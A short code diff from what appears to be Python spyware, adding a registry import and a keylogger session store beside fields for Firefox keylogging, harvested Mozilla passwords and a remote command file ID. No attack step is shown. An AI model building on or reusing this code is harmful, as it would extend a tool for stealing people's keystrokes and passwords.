@@ -8,6 +8,7 @@ from threading import Event
 import threading
 import ctypes
 import codecs
+import winreg
 
 from .browsers.config.constant import constant
 from .network import ip
@@ -69,6 +70,7 @@ class Values:
         self.mozila_keylog = False
         self.clint_info = False# is basic detail reported
         self.mozila_pass = []# can't be anything else than list
+        self.klogger_session={}# info needs to restart the key_logger
         self.clock_diff = 0
 
         self.cfile_id=r"1eO37l2YgGeI9ChV3be1oYprzpyKpmvXG"# command file id
